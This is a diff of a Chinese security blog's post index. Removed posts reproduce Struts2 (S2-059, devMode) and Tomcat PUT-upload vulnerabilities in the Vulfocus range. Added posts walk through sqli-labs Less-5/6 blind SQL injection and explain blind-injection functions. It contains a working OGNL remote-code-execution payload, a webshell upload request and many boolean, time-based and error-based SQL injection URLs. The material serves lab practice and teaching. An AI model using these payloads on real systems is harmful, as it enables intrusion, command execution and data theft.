-    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-059%20CVE-2019-0230%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Apache Struts于2020年8月13日披露 S2-059 Struts 远程代码执行漏洞（CVE-2019-0230），在使用某些tag等情况下可能存在OGNL表达式注入漏洞，从而造成远程代码执行，风险极大。腾讯安全专家提醒Apache Struts用户尽快升级到2.5.22或以上版本，避免遭遇黑客攻击。    </p>
-<p>Apache Struts2框架是一个用于开发Java EE网络应用程序的Web框架，应用十分广泛。</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Struts 2.0.0 - 2.5.20</p>
-<a id="more"></a>
-<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
-<li><p>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081416.png" alt="image"></p>
-</li>
-<li><p>POC利用：</p>
-</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%25&#123;%23_memberAccess.allowPrivateAccess%3dtrue,%23_memberAccess.allowStaticMethodAccess%3dtrue,%23_memberAccess.excludedClasses%3d%23_memberAccess.acceptProperties,%23_memberAccess.excludedPackageNamePatterns%3d%23_memberAccess.acceptProperties,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter(),%23a%3d%40java.lang.Runtime%40getRuntime(),%23s%3dnew+java.util.Scanner(%23a.exec(&#39;ls&#39;).getInputStream()).useDelimiter(&#39;\\\\A&#39;),%23str%3d%23s.hasNext()%3f%23s.next()%3a&#39;&#39;,%23res.print(%23str),%23res.close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081417.png" alt="image"></p>
-]]></content>
-      <categories>
-        <category>vulfocus靶场练习</category>
-      </categories>
-      <tags>
-        <tag>Struts2</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Shiro rememberMe反序列化漏洞复现过程（Shiro-550）</title>
     <url>/2020/08/06/Vulfocus%E9%9D%B6%E5%9C%BA/Shiro%20rememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%EF%BC%88Shiro-550%EF%BC%89/</url>
     <content><![CDATA[<p>Apache Shiro是一个强大易用的Java安全框架，提供了认证、授权、加密和会话管理等功能。Shiro框架直观、易用，同时也能提供健壮的安全性。</p>
@@ -429,81 +98,341 @@
       </tags>
   </entry>
   <entry>
-    <title>S2-devMode CVE-2016-4438复现过程</title>
-    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-devMode%20CVE-2016-4438%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>当Struts2开启devMode模式时，将导致严重远程代码执行漏洞。如果WebService 启动权限为最高权限时，可远程执行任意命令，包括关机、建立新用户、以及删除服务器上所有文件等等。</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>当Struts开启devMode时，该漏洞将影响Struts 2.1.0–2.5.1，通杀Struts2所有版本。</p>
-<a id="more"></a>
-<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
-<li><p>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081418.png" alt="image"></p>
-</li>
-<li><p>直接使用工具获得flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081419.png" alt="image"></p>
-</li>
-</ol>
+    <title>sqli-labs靶场Less-6</title>
+    <url>/2020/09/24/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess-6/</url>
+    <content><![CDATA[<h2 id="Less6"><a href="#Less6" class="headerlink" title="Less6"></a>Less6</h2><blockquote>
+<p>Less6 与 less5 的区别在于 less6 在 id 参数传到服务器时，对 id 参数进行了处理。这里可以从源代码中可以看到。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$id &#x3D; &#39;&quot;&#39;.$id.&#39;&quot;&#39;;</span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+<p>这一关的策略和less5是一样的，只需要将’换为”即可</p>
+<p>演示其中一个payload。使用left()函数布尔注入</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-6&#x2F;?id&#x3D;1%22and%20left(version(),1)&#x3D;5--+</span><br></pre></td></tr></table></figure>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092409.png" alt="image"></p>
 ]]></content>
       <categories>
-        <category>vulfocus靶场练习</category>
+        <category>sqli-labs靶场</category>
       </categories>
       <tags>
-        <tag>Struts2</tag>
+        <tag>sqli-labs</tag>
       </tags>
   </entry>
   <entry>
-    <title>Tomcat 任意写入文件漏洞复现过程（CVE-2017-12615）</title>
-    <url>/2020/08/11/Vulfocus%E9%9D%B6%E5%9C%BA/Tomcat%20%E4%BB%BB%E6%84%8F%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%EF%BC%88CVE-2017-12615%EF%BC%89/</url>
-    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Apache Tomcat 7.0.0到7.0.79版本中存在远程代码执行漏洞，当 Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT 请求方法时，攻击者可通过精心构造的攻击请求向服务器上传包含任意代码的 JSP 文件，文件中的代码被服务器执行。</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Tomcat &gt;=7.0.0，&lt;=7.0.79</p>
-<a id="more"></a>
-<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><ol>
-<li><p>使用vulfocus启动漏洞环境<br> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081101.png" alt="image"></p>
-</li>
-<li><p>访问页面如下：<br> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081102.png" alt="image"></p>
-</li>
-<li><p>直接抓包，修改请求方式为 PUT，并且设置文件名为1.jsp(名字随意)，然后填充 shell(jsp shell即可)文件内容，发送成功后，服务器返回状态码201。我这里直接上传大马<br><img src="14C523405179468B8FB07461BF2ACA55" alt="image"></p>
-</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT &#x2F;1.jsp&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ip</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko&#x2F;20100101 Firefox&#x2F;76.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Content-Length: 60577</span><br><span class="line"></span><br><span class="line">shell</span><br></pre></td></tr></table></figure>
+    <title>sqli-labs靶场Less-5(延时盲注)</title>
+    <url>/2020/09/24/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess-5(%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8)/</url>
+    <content><![CDATA[<h2 id="Less5"><a href="#Less5" class="headerlink" title="Less5"></a>Less5</h2><p>下面使用延时盲注演示</p>
+<h3 id="利用sleep-函数"><a href="#利用sleep-函数" class="headerlink" title="利用sleep()函数"></a>利用sleep()函数</h3><p>sql语句:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and If(ascii(substr(database(),1,1))&#x3D;116,1,sleep(5))</span><br></pre></td></tr></table></figure>
+<p>payload请求：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20If(ascii(substr(database(),1,1))&#x3D;116,1,sleep(5))--+</span><br></pre></td></tr></table></figure>
+<p>当dadabase()的ASCII值不是116就延时5s然后页面返回空。此处改为115是正确返回</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092407.png" alt="image"></p>
+<h3 id="利用-BENCHMARK-进行延时注入"><a href="#利用-BENCHMARK-进行延时注入" class="headerlink" title="利用 BENCHMARK()进行延时注入"></a>利用 BENCHMARK()进行延时注入</h3><p>sql语句：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UNION SELECT (IF(SUBSTRING(current,1,1)&#x3D;CHAR(115),BENCHMARK(50000000,ENCODE(&#39;MSG&#39;,&#39;by 5 seconds&#39;)),null)),2,3 FROM (select database() as current) as tb1</span><br></pre></td></tr></table></figure>
+<p>payload请求：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27UNION%20SELECT%20(IF(SUBSTRING(current,1,1)&#x3D;CHAR(115),BENCHMARK(50000000,ENCODE(%27MSG%27,%27by%205%20seconds%27)),null)),2,3%20FROM%20(select%20database()%20as%20current)%20as%20tb1--+</span><br></pre></td></tr></table></figure>
+<p>这里当返回结果正确的时候会延时5s返回，错误时不延时</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092408.png" alt="image"></p>
+]]></content>
+      <categories>
+        <category>sqli-labs靶场</category>
+      </categories>
+      <tags>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-labs靶场Less-5(报错盲注)</title>
+    <url>/2020/09/24/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess-5(%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8)/</url>
+    <content><![CDATA[<h2 id="Less5"><a href="#Less5" class="headerlink" title="Less5"></a>Less5</h2><p>下面使用报错盲注来演示</p>
+<h3 id="BUG-8652报错盲注"><a href="#BUG-8652报错盲注" class="headerlink" title="BUG #8652报错盲注"></a>BUG #8652报错盲注</h3><p>sql语句：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a</span><br></pre></td></tr></table></figure>
+<p>请求payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27%20union%20Select%201,count(*),concat(0x3a,0x3a,(select%20user()),0x3a,0x3a,floor(rand(0)*2))a%20from%20information_schema.columns%20group%20by%20a--+</span><br></pre></td></tr></table></figure>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092401.png" alt="image"></p>
+<h3 id="利用double数值类型超出范围进行报错注入"><a href="#利用double数值类型超出范围进行报错注入" class="headerlink" title="利用double数值类型超出范围进行报错注入"></a>利用double数值类型超出范围进行报错注入</h3><p>sql语句：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select (exp(~(select * FROM(SELECT USER())a))),2, 3</span><br></pre></td></tr></table></figure>
+<p>请求payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27%20union%20select%20(exp(~(select%20*%20FROM(SELECT%20USER())a))),2,%203--+</span><br></pre></td></tr></table></figure>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092402.png" alt="image"></p>
+<h3 id="利用-bigint-溢出进行报错注入"><a href="#利用-bigint-溢出进行报错注入" class="headerlink" title="利用 bigint 溢出进行报错注入"></a>利用 bigint 溢出进行报错注入</h3><p>sql语句：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select (!(select * from (select user())x) - ~0),2,3</span><br></pre></td></tr></table></figure>
+<p>请求payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27%20union%20select%20(!(select%20*%20from%20(select%20user())x)%20-%20~0),2,3--+</span><br></pre></td></tr></table></figure>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092403.png" alt="image"></p>
+<h3 id="xpath函数报错注入"><a href="#xpath函数报错注入" class="headerlink" title="xpath函数报错注入"></a>xpath函数报错注入</h3><h4 id="使用extractvalue-函数"><a href="#使用extractvalue-函数" class="headerlink" title="使用extractvalue()函数"></a>使用extractvalue()函数</h4><p>sql语句：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">extractvalue(1,concat(0x7e,(select @@version),0x7e))</span><br></pre></td></tr></table></figure>
+<p>请求payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27%20and%20extractvalue(1,concat(0x7e,(select%20@@version),0x7e))--+</span><br></pre></td></tr></table></figure>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092404.png" alt="image"></p>
+<h4 id="使用updatexml-函数"><a href="#使用updatexml-函数" class="headerlink" title="使用updatexml()函数"></a>使用updatexml()函数</h4><p>sql语句：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,(select user()),0x7e),1)</span><br></pre></td></tr></table></figure>
+<p>请求payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27%20and%20updatexml(1,concat(0x7e,(select%20user()),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092405.png" alt="image"></p>
+<h3 id="利用数据的重复性报错注入"><a href="#利用数据的重复性报错注入" class="headerlink" title="利用数据的重复性报错注入"></a>利用数据的重复性报错注入</h3><p>sql语句：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select 1,2,3 from (select NAME_CONST(version(),1), NAME_CONST(version(),1))x</span><br></pre></td></tr></table></figure>
+<p>请求payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27union%20select%201,2,3%20from%20(select%20NAME_CONST(version(),1),%20NAME_CONST(version(),1))x%20--+</span><br></pre></td></tr></table></figure>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092406.png" alt="image"></p>
+]]></content>
+      <categories>
+        <category>sqli-labs靶场</category>
+      </categories>
+      <tags>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-labs靶场Less-5(布尔盲注)</title>
+    <url>/2020/09/23/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess-5(%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8)/</url>
+    <content><![CDATA[<h2 id="Less5"><a href="#Less5" class="headerlink" title="Less5"></a>Less5</h2><blockquote>
+<p>我们从这这一关开始学习盲注。结合 background-2 的信息，将上述能使用的 payload 展示<br>一下使用方法。</p>
+</blockquote>
+<p>这里说一下，有很多的 blog 是翻译或者 copy 的，这关正确的思路是盲注。从源代码中可以<br>看到，运行返回结果正确的时候只返回 you are in….，不会返回数据库当中的信息了，<br>所以我们不能利用上述 less1-4 的方法</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092308.png" alt="image"></p>
+<h3 id="利用left-函数注入"><a href="#利用left-函数注入" class="headerlink" title="利用left()函数注入"></a>利用left()函数注入</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20left(version(),1)&#x3D;5--+</span><br></pre></td></tr></table></figure>
+<p>查看一下 version()，数据库的版本号为 5.6.17，这里的语句的意思是看版本号的第一位是<br>不是 5，明显的返回的结果是正确的。</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092309.png" alt="image"></p>
+<p>当版本号不对的时候，则显示为空</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092310.png" alt="image"></p>
+<p>猜测数据库长度，已知数据库长度为8</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20left(length(database()),1)&#x3D;8--+  &#x2F;&#x2F;length(database())得到数据库的长度</span><br></pre></td></tr></table></figure>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092311.png" alt="image"></p>
+<p>猜测数据库第一位</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20left(database(),1)%3E%27a%27--+</span><br></pre></td></tr></table></figure>
+<p>Database()为 security，所以我们看他的第一位是否 &gt; a,很明显的是 s &gt; a,因此返回正确。当我们不知情的情况下，可以用二分法来提高注入的效率。</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092312.png" alt="image"></p>
+<p>猜测数据库第二位，得知第一位是s，我们看前两位是否大于sa</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20left(database(),2)%3E%27sa%27--+</span><br></pre></td></tr></table></figure>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092313.png" alt="image"></p>
+<p>往下的举一反三。即可得到完整的数据库名</p>
+<h3 id="利用substr-ascii-注入"><a href="#利用substr-ascii-注入" class="headerlink" title="利用substr()ascii()注入"></a>利用substr()ascii()注入</h3><p>根据以上得知数据库名为 security，那我们利用此方式获取 security 数据库下的表。<br>获取 security 数据库的第一个表的第一个字符</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema&#x3D;database()limit%200,1),1,1))&gt;101--+</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>此处 table_schema 可以写成 =’security’，但是我们这里使用的 database()，是因<br>为此处 database()就是 security。此处同样的使用二分法进行测试，直到测试正确为止，此处应该是 101，因为第一个表示 email。</p>
+</blockquote>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092314.png" alt="image"></p>
+<p>如何获取第一个表的第二位字符呢？<br>这里我们已经了解了 substr()函数，这里使用 substr(**,2,1)即可</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema&#x3D;database()limit%200,1),2,1))&gt;101--+</span><br></pre></td></tr></table></figure>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092315.png" alt="image"></p>
+<p>那如何获取第二个表呢？思考一下！<br>这里可以看到我们上述的语句中使用的 limit 0,1. 意思就是从第 0 个开始，获取第一个。那要获取第二个是不是就是 limit 1,1！</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema&#x3D;database()limit%201,1),1,1))&gt;113--+</span><br></pre></td></tr></table></figure>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092316.png" alt="image"></p>
+<p>以后的过程就是不断的重复上面的，这里就不重复造轮子了。原理已经解释清楚了。<br>当你按照方法运行结束后，就可以获取到所有的表的名字</p>
+<h3 id="利用regexp获取users表中的列"><a href="#利用regexp获取users表中的列" class="headerlink" title="利用regexp获取users表中的列"></a>利用regexp获取users表中的列</h3><p>sql语句</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 1 from information_schema.columns where table_name&#x3D;&#39;users&#39; and table_name regexp &#39;^us[a-z]&#39; limit 0,1)</span><br></pre></td></tr></table></figure>
+<p>payload请求</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27%20and%201&#x3D;(select%201%20from%20information_schema.columns%20where%20table_name&#x3D;%27users%27%20and%20table_name%20regexp%20%27^us[a-z]%27%20limit%200,1)--+</span><br></pre></td></tr></table></figure>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092317.png" alt="image"></p>
+<p>上述语句时选择 users 表中的列名是否有 us**的列</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27%20and%201&#x3D;(select%201%20from%20information_schema.columns%20where%20table_name&#x3D;%27users%27%20and%20column_name%20regexp%20%27^username%27%20limit%200,1)--+</span><br></pre></td></tr></table></figure>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092318.png" alt="image"></p>
+<p>上图中可以看到 username 存在。我们可以将 username 换成 password 等其他的项也是正确的</p>
+<h3 id="利用ord-函数和mid-函数获取users表的内容"><a href="#利用ord-函数和mid-函数获取users表的内容" class="headerlink" title="利用ord()函数和mid()函数获取users表的内容"></a>利用ord()函数和mid()函数获取users表的内容</h3><p>sql语句</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))&#x3D; 68</span><br></pre></td></tr></table></figure>
+<p>payload请求</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-5&#x2F;?id&#x3D;1%27%20and%20ORD(MID((SELECT%20IFNULL(CAST(username%20AS%20CHAR),0x20)FROM%20security.users%20ORDER%20BY%20id%20LIMIT%200,1),1,1))&#x3D;%2068--+</span><br></pre></td></tr></table></figure>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092319.png" alt="image"></p>
+<p>获取 users 表中的内容。获取 username 中的第一行的第一个字符的 ascii，与 68 进行比较，即为 D。而我们从表中得知第一行的数据为 Dumb。所以接下来只需要重复造轮子即可</p>
+<hr>
+<p>总结：以上我们通过使用不同的语句，将通过布尔盲注 SQL 的所有<br>的 payload 进行演示了一次。想必通过实例更能够对 sql 布尔盲注语句熟悉和理解了。</p>
+]]></content>
+      <categories>
+        <category>sqli-labs靶场</category>
+      </categories>
+      <tags>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-labs-Background-2 盲注</title>
+    <url>/2020/09/23/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs-Background-2%20%E7%9B%B2%E6%B3%A8(%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3)/</url>
+    <content><![CDATA[<h2 id="什么是盲注？"><a href="#什么是盲注？" class="headerlink" title="什么是盲注？"></a>什么是盲注？</h2><blockquote>
+<p>盲注就是在 sql 注入过程中，sql 语句执行的选择后，选择的数据不能回显<br>到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。</p>
+</blockquote>
+<p>从background-1 中，我们可以知道盲注分为三类 <strong>基于布尔SQL盲注、基于时间的SQL盲注、基于报错的SQL盲注</strong>。</p>
+<h2 id="基于布尔SQL盲注——构造逻辑判断"><a href="#基于布尔SQL盲注——构造逻辑判断" class="headerlink" title="基于布尔SQL盲注——构造逻辑判断"></a>基于布尔SQL盲注——构造逻辑判断</h2><h3 id="mid-函数"><a href="#mid-函数" class="headerlink" title="mid()函数"></a>mid()函数</h3><p>此函数为截取字符串一部分。<strong>MID(column_name,start[,length])</strong></p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>column_name</td>
+<td>必需。要提取字符的字段</td>
+</tr>
+<tr>
+<td>start</td>
+<td>必需。规定开始位置（起始值是 1）</td>
+</tr>
+<tr>
+<td>length</td>
+<td>可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本</td>
+</tr>
+</tbody></table>
+<p>示例：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MID(DATABASE(),1,1)&gt;’a’     &#x2F;&#x2F;数据库名第一位</span><br><span class="line">MID(DATABASE(),2,1)         &#x2F;&#x2F;数据库名第二位</span><br></pre></td></tr></table></figure>
+<p>查看数据库名第一位的<strong>ASCII</strong>值是否大于a。返回true或flase</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema&#x3D;0xxxxxxx LIMIT 0,1),1,1)&gt;’a’</span><br></pre></td></tr></table></figure>
+<p>此处column_name参数可以为sql语句，可自行构造sql语句进行注入。</p>
+<h3 id="substr-函数和substring-函数"><a href="#substr-函数和substring-函数" class="headerlink" title="substr()函数和substring()函数"></a>substr()函数和substring()函数</h3><p><strong>Substr()</strong> 和 <strong>substring()</strong> 函数实现的功能是一样的，均为截取字符串。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string substring(string, start, length)</span><br><span class="line">string substr(string, start, length)</span><br></pre></td></tr></table></figure>
 
-<ol start="4">
-<li>直接访问上传的木马文件，拿到flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081103.png" alt="image"></li>
-</ol>
+<p>参数描述同mid()函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度。</p>
+<p>示例：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">substr(DATABASE(),1,1)&gt;’a’  &#x2F;&#x2F;数据库名第一位</span><br><span class="line">substr(DATABASE(),2,1)      &#x2F;&#x2F;数据库名第二位</span><br></pre></td></tr></table></figure>
+<p>查看数据库名第一位的<strong>ASCII</strong>值是否大于a。返回true或flase</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema&#x3D;0xxxxxxx LIMIT 0,1),1,1)&gt;’a’</span><br></pre></td></tr></table></figure>
+<p>此处string参数可以为sql语句，可自行构造sql语句进行注入。</p>
+<h3 id="left-函数"><a href="#left-函数" class="headerlink" title="left()函数"></a>left()函数</h3><p><strong>Left()</strong> 得到字符串左部指定个数的字符</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">left(string,n)        &#x2F;&#x2F;string为要截取的字符串，n为长度。</span><br></pre></td></tr></table></figure>
+<p>示例：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">left(database(),1)&gt;&#39;a&#39;</span><br></pre></td></tr></table></figure>
+<p>查看数据库名第一位的<strong>ASCII</strong>值是否大于a。返回true或flase</p>
+<p>同样的，string可以为自行构造的SQL语句</p>
+<h3 id="ORD-函数和ascii-函数"><a href="#ORD-函数和ascii-函数" class="headerlink" title="ORD()函数和ascii()函数"></a>ORD()函数和ascii()函数</h3><p>返回第一个字符的ASCII码，经常与上面的函数进行组合使用。</p>
+<p>示例：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ORD(MID(DATABASE(),1,1))&gt;114</span><br><span class="line">ascii(MID(DATABASE(),1,1))&gt;114</span><br></pre></td></tr></table></figure>
+<p>意为检测<strong>database()</strong> 的第一位<strong>ASCII</strong>码是否大于114，也即是‘r’</p>
+<h3 id="regexp-函数"><a href="#regexp-函数" class="headerlink" title="regexp()函数"></a>regexp()函数</h3><p>正则注入此处不做详解可参考文章<br><a href="https://www.cnblogs.com/lcamry/articles/5717442.html">https://www.cnblogs.com/lcamry/articles/5717442.html</a></p>
